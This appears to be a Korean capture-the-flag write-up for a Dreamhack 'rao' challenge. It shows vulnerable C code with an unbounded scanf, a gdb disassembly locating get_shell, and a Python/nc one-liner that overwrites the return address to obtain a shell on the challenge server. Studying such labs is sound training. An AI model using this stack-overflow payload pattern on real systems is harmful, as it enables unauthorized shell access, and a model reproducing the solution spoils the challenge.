```c
// Name: rao.c
// Compile: gcc -o rao rao.c -fno-stack-protector -no-pie

#include <stdio.h>
#include <unistd.h>

void init() {
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
}

void get_shell() {
  char *cmd = "/bin/sh";
  char *args[] = {cmd, NULL};

  execve(cmd, args, NULL);
}

int main() {
  char buf[0x28];

  init();

  printf("Input: ");
  scanf("%s", buf);

  return 0;
}
```

`rao.c` 코드를 읽어보면, `get_shell` 함수를 실행시킨다면 쉘을 얻을 수 있으며, 따라서 flag 역시 얻을 수 있음을 알 수 있다.
또한, `scanf("%s", buf);`에서 입력 크기를 제한하지 않는다는 취약점이 있음을 알 수 있다.
그러니 이 부분을 공략하자.

일단, `stdin`으로 넘겨줘야 하는 문자열을 구성하기 위해 `get_shell` 함수의 주소를 알아야 한다.

```bash
$ gdb -q rao
pwndbg: loaded 152 pwndbg commands and 47 shell commands. Type pwndbg [--shell | --all] [filter] for a list.
pwndbg: created $rebase, $ida GDB functions (can be used with print/break)
Reading symbols from rao...
(No debugging symbols found in rao)
------- tip of the day (disable with set show-tips off) -------
The $heap_base GDB variable can be used to refer to the starting address of the heap after running the heap command
pwndbg> disassemble get_shell
Dump of assembler code for function get_shell:
   0x00000000004006aa <+0>:     push   rbp
   0x00000000004006ab <+1>:     mov    rbp,rsp
   0x00000000004006ae <+4>:     sub    rsp,0x20
   0x00000000004006b2 <+8>:     lea    rax,[rip+0xfb]        # 0x4007b4
   0x00000000004006b9 <+15>:    mov    QWORD PTR [rbp-0x8],rax
   0x00000000004006bd <+19>:    mov    rax,QWORD PTR [rbp-0x8]
   0x00000000004006c1 <+23>:    mov    QWORD PTR [rbp-0x20],rax
   0x00000000004006c5 <+27>:    mov    QWORD PTR [rbp-0x18],0x0
   0x00000000004006cd <+35>:    lea    rcx,[rbp-0x20]
   0x00000000004006d1 <+39>:    mov    rax,QWORD PTR [rbp-0x8]
   0x00000000004006d5 <+43>:    mov    edx,0x0
   0x00000000004006da <+48>:    mov    rsi,rcx
   0x00000000004006dd <+51>:    mov    rdi,rax
   0x00000000004006e0 <+54>:    call   0x400550 <execve@plt>
   0x00000000004006e5 <+59>:    nop
   0x00000000004006e6 <+60>:    leave
   0x00000000004006e7 <+61>:    ret
End of assembler dump.
```

따라서 `get_shell` 함수의 주소는 `0x4006aa`임을 알 수 있으며, 리턴 주소 자리에 `b'\xaa\x06\x40\x00\x00\x00\x00\x00'`을 채워주면 쉘을 얻을 수 있다.
또한, `rao.c`의 `main` 함수에서 선언된 변수가 `0x28`바이트 크기로 선언된 배열인 `buf` 뿐이며, 스택은 `0x10`바이트 단위로 정렬되어야 하므로, `0x30`바이트의 공간이 할당되며, 그 뒤 `0x8`바이트가 SFP, 그 뒤 `0x8`바이트가 Return Address이다.
즉, `stdin`으로 넘겨줄 문자열의 첫 `0x38`바이트의 내용은 뭐가 되든 상관 없으며, 그 다음 8바이트를 `b'\xaa\x06\x40\x00\x00\x00\x00\x00'`로 채워주면 쉘을 탈취할 수 있다.

다음 명령어를 입력하면 서버에 연결한 후 쉘을 탈취할 수 있는 문자열이 버퍼에 저장되게 된다. 따라서 다음 명령어를 입력한 후 바로 엔터를 한 번 더 눌러주면 쉘을 얻을 수 있으며, 쉘을 얻었으니 어렵지 않게 flag를 얻을 수 있다.

```bash
$ (python3 -c "import sys; sys.stdout.buffer.write(b'A' * 0x38 + b'\xaa\x06\x40\x00\x00\x00\x00\x00')"; cat) | nc host3.dreamhack.games <port>
```